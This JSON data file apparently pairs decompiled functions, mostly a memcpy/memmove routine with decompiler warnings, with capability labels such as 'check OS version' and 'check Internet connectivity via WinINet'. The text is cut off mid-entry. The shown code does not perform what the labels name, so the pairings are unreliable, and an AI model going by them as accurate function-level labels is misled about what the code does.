{
    "004010cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004010cb(char *param_1)\n\n{\n    uint uVar1;\n    \n    if (*param_1 == '\\0') {\n        return 0;\n    }\n    uVar1 = fcn.00406140(param_1);\n    return uVar1;\n}\n",
        "token_count": 62
    },
    "004010df": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nulong * __cdecl fcn.004010df(ulong *arg_8h, ulong *noname_1, uint32_t arg_10h)\n\n{\n    ulong uVar1;\n    uchar auVar2 [32];\n    uchar auVar3 [32];\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    int32_t iVar16;\n    ulong *puVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    int32_t iVar20;\n    ulong *puVar21;\n    uint *puVar22;\n    uint *puVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    \n    if (arg_10h == 0) {\n        return arg_8h;\n    }\n    if ((noname_1 < arg_8h) && (arg_8h < arg_10h + noname_1)) {\n        puVar22 = (arg_10h - 4) + noname_1;\n        puVar23 = (arg_10h - 4) + arg_8h;\n        if ((puVar23 & 3) == 0) {\n            uVar19 = arg_10h >> 2;\n            if (uVar19 < 8) goto code_r0x00405690;\n            for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                *puVar23 = *puVar22;\n                puVar22 = puVar22 + -1;\n                puVar23 = puVar23 + -1;\n            }\n            switch(*((arg_10h & 3) * 4 + 0x4057b4)) {\n            case 0x4057cc:\ncode_r0x004057cc:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                return arg_8h;\n            case 0x4057dc:\ncode_r0x004057dc:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                return arg_8h;\n            case 0x4057f0:\ncode_r0x004057f0:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                *(puVar23 + 1) = *(puVar22 + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n            switch(*(arg_10h * 4 + 0x4057b4)) {\n            case 0x4057cc:\n                goto code_r0x004057cc;\n            case 0x4057dc:\n                goto code_r0x004057dc;\n            case 0x4057f0:\n                goto code_r0x004057f0;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar23 & 3);\n            switch(*((puVar23 & 3) * 4 + 0x4056b8)) {\n            case 0x4056c8:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                puVar22 = puVar22 + -1;\n                uVar19 = arg_10h >> 2;\n                puVar23 = puVar23 - 1;\n                if (uVar19 < 8) {\ncode_r0x00405690:\n    // WARNING: Could not recover jumptable at 0x00405692. Too many branches\n    // WARNING: Treating indirect jump as call\n                    puVar17 = (**(uVar19 * -4 + 0x405764))();\n                    return puVar17;\n                }\n                for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    *puVar23 = *puVar22;\n                    puVar22 = puVar22 + -1;\n                    puVar23 = puVar23 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x4057b4)) {\n                case 0x4057cc:\n                    goto code_r0x004057cc;\n                case 0x4057dc:\n                    goto code_r0x004057dc;\n                case 0x4057f0:\n                    goto code_r0x004057f0;\n                }\n                break;\n            case 0x4056ec:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                uVar19 = arg_10h >> 2;\n                *(puVar23 + 2) = *(puVar22 + 2);\n                puVar22 = puVar22 + -2;\n                puVar23 = puVar23 - 2;\n                if (uVar19 < 8) goto code_r0x00405690;\n                for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    *puVar23 = *puVar22;\n                    puVar22 = puVar22 + -1;\n                    puVar23 = puVar23 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x4057b4)) {\n                case 0x4057cc:\n                    goto code_r0x004057cc;\n                case 0x4057dc:\n                    goto code_r0x004057dc;\n                case 0x4057f0:\n                    goto code_r0x004057f0;\n                }\n                break;\n            case 0x405714:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                uVar19 = arg_10h >> 2;\n                *(puVar23 + 1) = *(puVar22 + 1);\n                puVar22 = puVar22 + -3;\n                puVar23 = puVar23 - 3;\n                if (uVar19 < 8) goto code_r0x00405690;\n                for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    *puVar23 = *puVar22;\n                    puVar22 = puVar22 + -1;\n                    puVar23 = puVar23 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x4057b4)) {\n                case 0x4057cc:\n                    goto code_r0x004057cc;\n                case 0x4057dc:\n                    goto code_r0x004057dc;\n                case 0x4057f0:\n                    goto code_r0x004057f0;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar17 = arg_8h;\n    if ((*0x44500c >> 1 & 1) != 0) {\n        for (; arg_10h != 0; arg_10h = arg_10h - 1) {\n            *puVar17 = *noname_1;\n            noname_1 = noname_1 + 1;\n            puVar17 = puVar17 + 1;\n        }\n        return arg_8h;\n    }\n    if (arg_10h < 0x80) {\ncode_r0x004054eb:\n        if ((arg_8h & 3) != 0) {\ncode_r0x00405508:\n            if (arg_10h < 4) {\n                switch(*((arg_10h - 4) * 4 + 0x405628)) {\n                case 0x405628:\n                    return arg_8h;\n                case 0x405630:\n                    goto code_r0x00405630;\n                case 0x405650:\n                    goto code_r0x00405650;\n                }\n                goto code_r0x0040563c;\n            }\n            uVar19 = (arg_10h - 4) + (arg_8h & 3);\n            switch(*((arg_8h & 3) * 4 + 0x40552c)) {\n            case 0x40553c:\n                *arg_8h = *noname_1;\n                *(arg_8h + 1) = *(noname_1 + 1);\n                uVar18 = uVar19 >> 2;\n                *(arg_8h + 2) = *(noname_1 + 2);\n                noname_1 = noname_1 + 3;\n                puVar17 = arg_8h + 3;\n                if (7 < uVar18) {\n                    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                        *puVar17 = *noname_1;\n                        noname_1 = noname_1 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    switch(*((uVar19 & 3) * 4 + 0x405618)) {\n                    case 0x405628:\n                        return arg_8h;\n                    case 0x40563c:\n                        goto code_r0x0040563c;\n                    case 0x405650:\n                        goto code_r0x00405650;\n                    }\n                    break;\n                }\n                goto code_r0x00405528;\n            case 0x405568:\n                *arg_8h = *noname_1;\n                uVar18 = uVar19 >> 2;\n                *(arg_8h + 1) = *(noname_1 + 1);\n                noname_1 = noname_1 + 2;\n                puVar17 = arg_8h + 2;\n                if (uVar18 < 8) goto code_r0x00405528;\n                for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                    *puVar17 = *noname_1;\n                    noname_1 = noname_1 + 4;\n                    puVar17 = puVar17 + 4;\n                }\n                switch(*((uVar19 & 3) * 4 + 0x405618)) {\n                case 0x405628:\n                    return arg_8h;\n                case 0x40563c:\n                    goto code_r0x0040563c;\n                case 0x405650:\n                    goto code_r0x00405650;\n                }\n                break;\n            case 0x40558c:\n                *arg_8h = *noname_1;\n                uVar18 = uVar19 >> 2;\n                noname_1 = noname_1 + 1;\n                puVar17 = arg_8h + 1;\n                if (uVar18 < 8) goto code_r0x00405528;\n                for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                    *puVar17 = *noname_1;\n                    noname_1 = noname_1 + 4;\n                    puVar17 = puVar17 + 4;\n                }\n                switch(*((uVar19 & 3) * 4 + 0x405618)) {\n                case 0x405628:\n                    return arg_8h;\n                case 0x40563c:\n                    goto code_r0x0040563c;\n                case 0x405650:\n                    goto code_r0x00405650;\n                }\n                break;\n            case 0x90004055:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            goto code_r0x00405630;\n        }\n    }\n    else {\n        if ((((arg_8h ^ noname_1) & 0xf) == 0) && ((*0x443008 >> 1 & 1) != 0)) {\n            if ((noname_1 & 0xf) != 0) {\n                uVar18 = 0x10 - (noname_1 & 0xf);\n                arg_10h = arg_10h - uVar18;\n                for (uVar19 = uVar18 & 3; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    *puVar17 = *noname_1;\n                    noname_1 = noname_1 + 1;\n                    puVar17 = puVar17 + 1;\n                }\n                for (uVar18 = uVar18 >> 2; uVar18 != 0; uVar18 = uVar18 - 1) {\n                    *puVar17 = *noname_1;\n                    noname_1 = noname_1 + 4;\n                    puVar17 = puVar17 + 4;\n                }\n            }\n            for (uVar19 = arg_10h >> 7; uVar19 != 0; uVar19 = uVar19 - 1) {\n                uVar24 = *(noname_1 + 4);\n                uVar25 = *(noname_1 + 1);\n                uVar26 = *(noname_1 + 0xc);\n                uVar4 = *(noname_1 + 2);\n                uVar5 = *(noname_1 + 0x14);\n                uVar6 = *(noname_1 + 3);\n                uVar7 = *(noname_1 + 0x1c);\n                uVar8 = *(noname_1 + 4);\n                uVar9 = *(noname_1 + 0x24);\n                uVar10 = *(noname_1 + 5);\n                uVar11 = *(noname_1 + 0x2c);\n                uVar12 = *(noname_1 + 6);\n                uVar13 = *(noname_1 + 0x34);\n                uVar14 = *(noname_1 + 7);\n                uVar15 = *(noname_1 + 0x3c);\n                *puVar17 = *noname_1;\n                *(puVar17 + 4) = uVar24;\n                *(puVar17 + 1) = uVar25;\n                *(puVar17 + 0xc) = uVar26;\n                *(puVar17 + 2) = uVar4;\n                *(puVar17 + 0x14) = uVar5;\n                *(puVar17 + 3) = uVar6;\n                *(puVar17 + 0x1c) = uVar7;\n                *(puVar17 + 4) = uVar8;\n                *(puVar17 + 0x24) = uVar9;\n                *(puVar17 + 5) = uVar10;\n                *(puVar17 + 0x2c) = uVar11;\n                *(puVar17 + 6) = uVar12;\n                *(puVar17 + 0x34) = uVar13;\n                *(puVar17 + 7) = uVar14;\n                *(puVar17 + 0x3c) = uVar15;\n                uVar24 = *(noname_1 + 0x44);\n                uVar25 = *(noname_1 + 9);\n                uVar26 = *(noname_1 + 0x4c);\n                uVar4 = *(noname_1 + 10);\n                uVar5 = *(noname_1 + 0x54);\n                uVar6 = *(noname_1 + 0xb);\n                uVar7 = *(noname_1 + 0x5c);\n                uVar8 = *(noname_1 + 0xc);\n                uVar9 = *(noname_1 + 100);\n                uVar10 = *(noname_1 + 0xd);\n                uVar11 = *(noname_1 + 0x6c);\n                uVar12 = *(noname_1 + 0xe);\n                uVar13 = *(noname_1 + 0x74);\n                uVar14 = *(noname_1 + 0xf);\n                uVar15 = *(noname_1 + 0x7c);\n                *(puVar17 + 8) = *(noname_1 + 8);\n                *(puVar17 + 0x44) = uVar24;\n                *(puVar17 + 9) = uVar25;\n                *(puVar17 + 0x4c) = uVar26;\n                *(puVar17 + 10) = uVar4;\n                *(puVar17 + 0x54) = uVar5;\n                *(puVar17 + 0xb) = uVar6;\n                *(puVar17 + 0x5c) = uVar7;\n                *(puVar17 + 0xc) = uVar8;\n                *(puVar17 + 100) = uVar9;\n                *(puVar17 + 0xd) = uVar10;\n                *(puVar17 + 0x6c) = uVar11;\n                *(puVar17 + 0xe) = uVar12;\n                *(puVar17 + 0x74) = uVar13;\n                *(puVar17 + 0xf) = uVar14;\n                *(puVar17 + 0x7c) = uVar15;\n                noname_1 = noname_1 + 0x10;\n                puVar17 = puVar17 + 0x10;\n            }\n            if ((arg_10h & 0x7f) != 0) {\n                for (uVar19 = (arg_10h & 0x7f) >> 4; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    uVar24 = *(noname_1 + 4);\n                    uVar25 = *(noname_1 + 1);\n                    uVar26 = *(noname_1 + 0xc);\n                    *puVar17 = *noname_1;\n                    *(puVar17 + 4) = uVar24;\n                    *(puVar17 + 1) = uVar25;\n                    *(puVar17 + 0xc) = uVar26;\n                    noname_1 = noname_1 + 2;\n                    puVar17 = puVar17 + 2;\n                }\n                if ((arg_10h & 0xf) != 0) {\n                    for (uVar19 = (arg_10h & 0xf) >> 2; uVar19 != 0; uVar19 = uVar19 - 1) {\n                        *puVar17 = *noname_1;\n                        noname_1 = noname_1 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    for (arg_10h = arg_10h & 3; arg_10h != 0; arg_10h = arg_10h - 1) {\n                        *puVar17 = *noname_1;\n                        noname_1 = noname_1 + 1;\n                        puVar17 = puVar17 + 1;\n                    }\n                }\n            }\n            return arg_8h;\n        }\n        if ((*0x44500c & 1) == 0) goto code_r0x004054eb;\n        if ((arg_8h & 3) != 0) goto code_r0x00405508;\n        if ((noname_1 & 3) == 0) {\n            if ((arg_8h >> 2 & 1) != 0) {\n                uVar24 = *noname_1;\n                arg_10h = arg_10h - 4;\n                noname_1 = noname_1 + 4;\n                *arg_8h = uVar24;\n                arg_8h = arg_8h + 4;\n            }\n            if ((arg_8h >> 3 & 1) != 0) {\n                uVar1 = *noname_1;\n                arg_10h = arg_10h - 8;\n                noname_1 = noname_1 + 1;\n                *arg_8h = uVar1;\n                arg_8h = arg_8h + 1;\n            }\n            if ((noname_1 & 7) == 0) {\n                puVar17 = noname_1 + -1;\n                uVar24 = *noname_1;\n                uVar25 = *(noname_1 + 4);\n                do {\n                    puVar21 = puVar17;\n                    uVar5 = *(puVar21 + 4);\n                    uVar6 = *(puVar21 + 0x24);\n                    arg_10h = arg_10h - 0x30;\n                    auVar2 = *(puVar21 + 2);\n                    uVar26 = *(puVar21 + 7);\n                    uVar4 = *(puVar21 + 0x3c);\n                    auVar3 = *(puVar21 + 4);\n                    *(arg_8h + 1) = uVar24;\n                    *(arg_8h + 0xc) = uVar25;\n                    *(arg_8h + 2) = uVar5;\n                    *(arg_8h + 0x14) = uVar6;\n                    *(arg_8h + 2) = SUB3216(auVar2 >> 0x40, 0);\n                    *(arg_8h + 4) = SUB3216(auVar3 >> 0x40, 0);\n                    arg_8h = arg_8h + 6;\n                    puVar17 = puVar21 + 6;\n                    uVar24 = uVar26;\n                    uVar25 = uVar4;\n                } while (0x2f < arg_10h);\n                puVar21 = puVar21 + 7;\n            }\n            else if ((noname_1 >> 3 & 1) == 0) {\n                iVar16 = noname_1 + -4;\n                uVar24 = *noname_1;\n                uVar25 = *(noname_1 + 4);\n                uVar26 = *(noname_1 + 1);\n                do {\n                    iVar20 = iVar16;\n                    uVar7 = *(iVar20 + 0x20);\n                    arg_10h = arg_10h - 0x30;\n                    auVar2 = *(iVar20 + 0x10);\n                    uVar4 = *(iVar20 + 0x34);\n                    uVar5 = *(iVar20 + 0x38);\n                    uVar6 = *(iVar20 + 0x3c);\n                    auVar3 = *(iVar20 + 0x20);\n                    *(arg_8h + 4) = uVar24;\n                    *(arg_8h + 1) = uVar25;\n                    *(arg_8h + 0xc) = uVar26;\n                    *(arg_8h + 2) = uVar7;\n                    *(arg_8h + 2) = SUB3216(auVar2 >> 0x20, 0);\n                    *(arg_8h + 4) = SUB3216(auVar3 >> 0x20, 0);\n                    arg_8h = arg_8h + 6;\n                    iVar16 = iVar20 + 0x30;\n                    uVar24 = uVar4;\n                    uVar25 = uVar5;\n                    uVar26 = uVar6;\n                } while (0x2f < arg_10h);\n                puVar21 = iVar20 + 0x34;\n            }\n            else {\n                iVar16 = noname_1 + -0xc;\n                uVar24 = *noname_1;\n                do {\n                    iVar20 = iVar16;\n                    uVar26 = *(iVar20 + 0x20);\n                    uVar4 = *(iVar20 + 0x24);\n                    uVar5 = *(iVar20 + 0x28);\n                    arg_10h = arg_10h - 0x30;\n                    auVar2 = *(iVar20 + 0x10);\n                    uVar25 = *(iVar20 + 0x3c);\n                    auVar3 = *(iVar20 + 0x20);\n                    *(arg_8h + 0xc) = uVar24;\n                    *(arg_8h + 2) = uVar26;\n                    *(arg_8h + 0x14) = uVar4;\n                    *(arg_8h + 3) = uVar5;\n                    *(arg_8h + 2) = SUB3216(auVar2 >> 0x60, 0);\n                    *(arg_8h + 4) = SUB3216(auVar3 >> 0x60, 0);\n                    arg_8h = arg_8h + 6;\n                    iVar16 = iVar20 + 0x30;\n                    uVar24 = uVar25;\n                } while (0x2f < arg_10h);\n                puVar21 = iVar20 + 0x3c;\n            }\n            for (; 0xf < arg_10h; arg_10h = arg_10h - 0x10) {\n                uVar24 = *puVar21;\n                uVar25 = *(puVar21 + 4);\n                uVar26 = *(puVar21 + 1);\n                uVar4 = *(puVar21 + 0xc);\n                puVar21 = puVar21 + 2;\n                *arg_8h = uVar24;\n                *(arg_8h + 4) = uVar25;\n                *(arg_8h + 1) = uVar26;\n                *(arg_8h + 0xc) = uVar4;\n                arg_8h = arg_8h + 2;\n            }\n            if ((arg_10h >> 2 & 1) != 0) {\n                uVar24 = *puVar21;\n                arg_10h = arg_10h - 4;\n                puVar21 = puVar21 + 4;\n                *arg_8h = uVar24;\n                arg_8h = arg_8h + 4;\n            }\n            if ((arg_10h >> 3 & 1) != 0) {\n                arg_10h = arg_10h - 8;\n                *arg_8h = *puVar21;\n            }\n    // WARNING: Could not recover jumptable at 0x004054e9. Too many branches\n    // WARNING: Treating indirect jump as call\n            puVar17 = (**(arg_10h * 4 + 0x405618))();\n            return puVar17;\n        }\n    }\n    uVar18 = arg_10h >> 2;\n    if (uVar18 < 8) {\ncode_r0x00405528:\n    // WARNING: Could not recover jumptable at 0x00405528. Too many branches\n    // WARNING: Treating indirect jump as call\n        puVar17 = (**(uVar18 * 4 + 0x4055ac))();\n        return puVar17;\n    }\n    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n        *puVar17 = *noname_1;\n        noname_1 = noname_1 + 4;\n        puVar17 = puVar17 + 4;\n    }\n    switch(*((arg_10h & 3) * 4 + 0x405618)) {\n    case 0x405628:\n        return arg_8h;\n    case 0x40563c:\ncode_r0x0040563c:\n        *puVar17 = *noname_1;\n        *(puVar17 + 1) = *(noname_1 + 1);\n        return arg_8h;\n    case 0x405650:\ncode_r0x00405650:\n        *puVar17 = *noname_1;\n        *(puVar17 + 1) = *(noname_1 + 1);\n        *(puVar17 + 2) = *(noname_1 + 2);\n        return arg_8h;\n    }\ncode_r0x00405630:\n    *puVar17 = *noname_1;\n    return arg_8h;\n}\n",
        "token_count": 6290
    },
    "004010f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n\nulong * __cdecl fcn.004010f3(ulong *arg_8h, ulong *noname_1, uint32_t arg_10h)\n\n{\n    ulong uVar1;\n    uchar auVar2 [32];\n    uchar auVar3 [32];\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    int32_t iVar16;\n    ulong *puVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    int32_t iVar20;\n    ulong *puVar21;\n    uint *puVar22;\n    uint *puVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    \n    if (arg_10h == 0) {\n        return arg_8h;\n    }\n    if ((noname_1 < arg_8h) && (arg_8h < arg_10h + noname_1)) {\n        puVar22 = (arg_10h - 4) + noname_1;\n        puVar23 = (arg_10h - 4) + arg_8h;\n        if ((puVar23 & 3) == 0) {\n            uVar19 = arg_10h >> 2;\n            if (uVar19 < 8) goto code_r0x00405ea0;\n            for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                *puVar23 = *puVar22;\n                puVar22 = puVar22 + -1;\n                puVar23 = puVar23 + -1;\n            }\n            switch(*((arg_10h & 3) * 4 + 0x405fc4)) {\n            case 0x405fdc:\ncode_r0x00405fdc:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                return arg_8h;\n            case 0x405fec:\ncode_r0x00405fec:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                return arg_8h;\n            case 0x406000:\ncode_r0x00406000:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                *(puVar23 + 1) = *(puVar22 + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n            switch(*(arg_10h * 4 + 0x405fc4)) {\n            case 0x405fdc:\n                goto code_r0x00405fdc;\n            case 0x405fec:\n                goto code_r0x00405fec;\n            case 0x406000:\n                goto code_r0x00406000;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar23 & 3);\n            switch(*((puVar23 & 3) * 4 + 0x405ec8)) {\n            case 0x405ed8:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                puVar22 = puVar22 + -1;\n                uVar19 = arg_10h >> 2;\n                puVar23 = puVar23 - 1;\n                if (uVar19 < 8) {\ncode_r0x00405ea0:\n    // WARNING: Could not recover jumptable at 0x00405ea2. Too many branches\n    // WARNING: Treating indirect jump as call\n                    puVar17 = (**(uVar19 * -4 + 0x405f74))();\n                    return puVar17;\n                }\n                for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    *puVar23 = *puVar22;\n                    puVar22 = puVar22 + -1;\n                    puVar23 = puVar23 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x405fc4)) {\n                case 0x405fdc:\n                    goto code_r0x00405fdc;\n                case 0x405fec:\n                    goto code_r0x00405fec;\n                case 0x406000:\n                    goto code_r0x00406000;\n                }\n                break;\n            case 0x405efc:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                uVar19 = arg_10h >> 2;\n                *(puVar23 + 2) = *(puVar22 + 2);\n                puVar22 = puVar22 + -2;\n                puVar23 = puVar23 - 2;\n                if (uVar19 < 8) goto code_r0x00405ea0;\n                for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    *puVar23 = *puVar22;\n                    puVar22 = puVar22 + -1;\n                    puVar23 = puVar23 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x405fc4)) {\n                case 0x405fdc:\n                    goto code_r0x00405fdc;\n                case 0x405fec:\n                    goto code_r0x00405fec;\n                case 0x406000:\n                    goto code_r0x00406000;\n                }\n                break;\n            case 0x405f24:\n                *(puVar23 + 3) = *(puVar22 + 3);\n                *(puVar23 + 2) = *(puVar22 + 2);\n                uVar19 = arg_10h >> 2;\n                *(puVar23 + 1) = *(puVar22 + 1);\n                puVar22 = puVar22 + -3;\n                puVar23 = puVar23 - 3;\n                if (uVar19 < 8) goto code_r0x00405ea0;\n                for (; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    *puVar23 = *puVar22;\n                    puVar22 = puVar22 + -1;\n                    puVar23 = puVar23 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x405fc4)) {\n                case 0x405fdc:\n                    goto code_r0x00405fdc;\n                case 0x405fec:\n                    goto code_r0x00405fec;\n                case 0x406000:\n                    goto code_r0x00406000;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    puVar17 = arg_8h;\n    if ((*0x44500c >> 1 & 1) != 0) {\n        for (; arg_10h != 0; arg_10h = arg_10h - 1) {\n            *puVar17 = *noname_1;\n            noname_1 = noname_1 + 1;\n            puVar17 = puVar17 + 1;\n        }\n        return arg_8h;\n    }\n    if (arg_10h < 0x80) {\ncode_r0x00405cfb:\n        if ((arg_8h & 3) != 0) {\ncode_r0x00405d18:\n            if (arg_10h < 4) {\n                switch(*((arg_10h - 4) * 4 + 0x405e38)) {\n                case 0x405e38:\n                    return arg_8h;\n                case 0x405e40:\n                    goto code_r0x00405e40;\n                case 0x405e60:\n                    goto code_r0x00405e60;\n                }\n                goto code_r0x00405e4c;\n            }\n            uVar19 = (arg_10h - 4) + (arg_8h & 3);\n            switch(*((arg_8h & 3) * 4 + 0x405d3c)) {\n            case 0x405d4c:\n                *arg_8h = *noname_1;\n                *(arg_8h + 1) = *(noname_1 + 1);\n                uVar18 = uVar19 >> 2;\n                *(arg_8h + 2) = *(noname_1 + 2);\n                noname_1 = noname_1 + 3;\n                puVar17 = arg_8h + 3;\n                if (7 < uVar18) {\n                    for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                        *puVar17 = *noname_1;\n                        noname_1 = noname_1 + 4;\n                        puVar17 = puVar17 + 4;\n                    }\n                    switch(*((uVar19 & 3) * 4 + 0x405e28)) {\n                    case 0x405e38:\n                        return arg_8h;\n                    case 0x405e4c:\n                        goto code_r0x00405e4c;\n                    case 0x405e60:\n                        goto code_r0x00405e60;\n                    }\n                    break;\n                }\n                goto code_r0x00405d38;\n            case 0x405d78:\n                *arg_8h = *noname_1;\n                uVar18 = uVar19 >> 2;\n                *(arg_8h + 1) = *(noname_1 + 1);\n                noname_1 = noname_1 + 2;\n                puVar17 = arg_8h + 2;\n                if (uVar18 < 8) goto code_r0x00405d38;\n                for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                    *puVar17 = *noname_1;\n                    noname_1 = noname_1 + 4;\n                    puVar17 = puVar17 + 4;\n                }\n                switch(*((uVar19 & 3) * 4 + 0x405e28)) {\n                case 0x405e38:\n                    return arg_8h;\n                case 0x405e4c:\n                    goto code_r0x00405e4c;\n                case 0x405e60:\n                    goto code_r0x00405e60;\n                }\n                break;\n            case 0x405d9c:\n                *arg_8h = *noname_1;\n                uVar18 = uVar19 >> 2;\n                noname_1 = noname_1 + 1;\n                puVar17 = arg_8h + 1;\n                if (uVar18 < 8) goto code_r0x00405d38;\n                for (; uVar18 != 0; uVar18 = uVar18 - 1) {\n                    *puVar17 = *noname_1;\n                    noname_1 = noname_1 + 4;\n                    puVar17 = puVar17 + 4;\n                }\n                switch(*((uVar19 & 3) * 4 + 0x405e28)) {\n                case 0x405e38:\n                    return arg_8h;\n                case 0x405e4c:\n                    goto code_r0x00405e4c;\n                case 0x405e60:\n                    goto code_r0x00405e60;\n                }\n                break;\n            case 0x9000405d:\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            goto code_r0x00405e40;\n        }\n    }\n    else {\n        if ((((arg_8h ^ noname_1) & 0xf) == 0) && ((*0x443008 >> 1 & 1) != 0)) {\n            if ((noname_1 & 0xf) != 0) {\n                uVar18 = 0x10 - (noname_1 & 0xf);\n                arg_10h = arg_10h - uVar18;\n                for (uVar19 = uVar18 & 3; uVar19 != 0; uVar19 = uVar19 - 1) {\n                    *puVar17 = *noname_1;\n                    noname_1 = noname_1 + 1;\n                    puVar17 = puVar17 + 1;\n                }\n                for (uVar18 = uVar18 >> 2; uVar18 != 0; uVar18 = uVar18 - 1) {\n                    *puVar17 = *noname_1;\n                    noname_1 = noname_1 + 4;\n                    puVar17 = puVar17 + 4;\n                }\n            }\n            for (uVar19 = arg_10h >> 7; uVar19 != 0; uVar19 = uVar19 - 1) {\n                uVar24 = *(noname_1 + 4);\n                uVar25 = *(noname_1 + 1);\n                uVar26 = *(noname_1 + 0xc);\n                uVar4 = *(noname_1 + 2);\n                uVar5 = *(noname_1 + 0x14);\n                uVar6 = *(noname_1 + 3);\n                uVar7 = *(noname_1 + 0x1c);\n                uVar8 = *(noname_1 + 4);\n                uVar9 = *(noname_1 + 0x24);\n                uVar10 = *(noname_1 + 5);\n                uVar11 = *(noname_1 + 0x2c);\n                uVar12 = *(noname_1 + 6);\n                uVar13 = *(noname_1 + 0x34);\n                uVar14 = *(noname_1 + 7);\n                uVar15 = *(noname_1 + 0x3c);\n                *puVar17 = *noname_1;\n                *(puVar17 + 4) = uVar24;\n                *(puVar17 + 1) = uVar25;\n                *(puVar17 + 0xc) = uVar26;\n                *(puVar17 + 2) = uVar4;\n                *(puVar17 + 0x14) = uVar5;\n                *(puVar17 + 3) = uVar6;\n                *(puVar17 + 0x1c) = uVar7;\n                *(puVar17 + 4) = uVar8;\n                *(puVar17 + 0x24) = uVar9;\n                *(puVar17 + 5) = uVar10;\n                *(puVar17 + 0x2c) = uVar11;\n                *(puVar17 + 6) = uVar12;\n                *(puVar17 + 0x34) = uVar13;\n                *(puVar17 + 7) = uVar14;\n                *(puVar17 + 0x3c) = uVar15;\n                uVar24 = *(noname_1 + 0x44);\n                uVar25 = *(noname_1 + 9);\n                uVar26 = *(noname_1 + 0x4c);\n                uVar4 = *(noname_1 + 10);\n                uVar5 = *(noname_1 + 0x54);\n                uVar6 = *(noname_1 + 0xb);\n                uVar7 = *(noname_1 + 0x5c);\n                uVar8 = *(noname_1 + 0xc);\n                uVar9 = *(noname_1 + 100);\n                uVar10 = *(noname_1 + 0xd);\n                uVar11 = *(noname_1 + 0x6c);\n                uVar12 = *(noname_1 + 0xe);\n                uVar13 = *(noname_1 + 0x74);\n                uVar14 = *(noname_1 + 0xf);\n                uVar15 = *(noname_1 + 0x7c);\n                *(puVar17 + 8) = *(noname_1 + 8);\n                *(puVar17 + 0x44) = uVar24;\n                *(puVar17 + 9) = uVar25;\n                *(puVar17 + 0x4c) = uVar26;\n                *(puVar17 + 10) = uVar4;\n                *(puVar17 + 0x54) = uVar5;\n                *(puVar17 + 0xb) = uVar6;\n                *(puVar17 + 0x5c) = uVar7;\n                *(puVar17 + 0xc) = uVar8;\n                *(puVar17 + 100) = 